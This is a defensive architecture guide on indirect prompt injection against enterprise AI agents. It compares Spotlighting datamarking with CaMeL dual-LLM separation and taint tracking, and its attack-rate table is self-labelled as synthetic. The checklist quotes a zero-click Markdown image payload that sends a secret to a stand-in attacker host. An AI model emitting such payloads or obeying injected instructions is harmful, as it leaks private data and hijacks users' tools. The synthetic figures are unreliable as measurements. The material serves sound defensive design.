# Enterprise LLM & Agent Security Architecture Guide (OWASP Agentic Top 10 / Indirect Prompt Injection `XPIA`): `Spotlighting Datamarking` vs. `CaMeL` Control/Data Separation & Taint Tracking

> **Language**: [中文](./llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-selection-faq.md) | **English (Current)**  
> **Audience**: Cloud & AI Infrastructure Solution Architects and Enterprise CISOs / AI Security Architects  
> **Provenance**: `synthetic + anonymized_reported` (`independently_reproduced=false`, `physical_gpu_cluster_measurement=not_measured`)

![Enterprise Agent Security Spotlighting vs CaMeL Control Data Separation Summary](../../assets/svg/llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-selection-faq-summary.svg)

---

## 1. 📌 Executive Summary

> **Bottom Line**: **Whenever an enterprise AI Agent combines the "Lethal Trifecta"—(1) reading untrusted external content (emails, resumes, web pages), (2) accessing private corporate data, and (3) holding write/exfiltration tools (`send_email`, `webhook`, `update_crm`)—flat prompt concatenation (`Tier 1`) suffers a `48.5%` Indirect Prompt Injection (`XPIA`) tool-hijack Attack Success Rate (`ASR`) and `41.2%` data exfiltration rate. Even pairing `Prompt Shield` classifiers with Microsoft `Spotlighting` datamarking (`Tier 2`) leaves a `6.8%` residual bypass rate against adaptive attacks. To achieve deterministic control-flow integrity, production agents must adopt `CaMeL` Dual-LLM Privilege Separation (`Privileged Planner` + Tool-Free `Quarantined Reader`) + Deterministic Data-Flow Taint Tracking + `Spotlighting` (`Tier 4`): reducing indirect injection tool hijacking and unauthorized exfiltration to `0.0%` while preserving `96.2%` benign task utility at `+28.0 ms` policy overhead.**

- **Interactive Agent XPIA Security & Privilege Isolation Sizer**: [Open Interactive Sizer (`llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-sizer.html`)](../reports/llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-sizer.html)
- **7-Card 4:5 Visual Report**: [Open 7-Card Report (`llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-selection-cards.html`)](../reports/llm-security-indirect-prompt-injection-spotlighting-camel-privilege-isolation-selection-cards.html)

---

## 2. 📊 4-Tier Indirect Prompt Injection (`XPIA`) Defense Matrix (`1,000` Adaptive Red-Team Variants)

| Metric | Tier 1: Flat Prompt Concatenation + Unrestricted Tools | Tier 2: `Prompt Shield` + `Spotlighting` Datamarking | Tier 3: Instruction Hierarchy + Manual Write Popups | Tier 4 (Recommended): `CaMeL` Dual-LLM Separation + Taint Policy Gate |
| :--- | :--- | :--- | :--- | :--- |
| **Tool-Hijack Attack Success (`ASR`)** | `48.5%` ✕ | `6.8%` (Probabilistic) | `2.4%` | **`0.0%` ✓ (Control-flow isolated)** |
| **Unauthorized Data Exfiltration** | `41.2%` ✕ | `4.2%` | `0.8%` | **`0.0%` ✓ (Taint-blocked egress)** |
| **Benign Task Utility Retention** | `100.0%` | `98.5%` ✓ | `78.0%` ✕ (Approval fatigue) | **`96.2%` ✓** |
| **Security Policy Latency Overhead** | `+0.0 ms` | `+12.0 ms` ✓ | `+45.0 ms` | **`+28.0 ms` ✓** |
| **Zero-Trust Security Verdict** | **`CRITICAL FAIL` ✕** | `PARTIAL` (Read-only OK) | `PASS` (High friction) | **`PASS` ✓ (Deterministic CFI)** |

---

## 3. 🛠️ Production Readiness Checklist

- [ ] **Break the Lethal Trifecta via `CaMeL` Dual-LLM Isolation**: Ensure the Privileged Planner LLM only sees trusted user prompts to emit the locked tool call graph, while untrusted documents are processed exclusively by a tool-free Quarantined Reader LLM.
- [ ] **Enforce Strict Frontend `Content-Security-Policy: img-src 'self' data:`** to block zero-click Markdown image exfiltration (`![exfil](https://attacker.com/?q=secret)`).
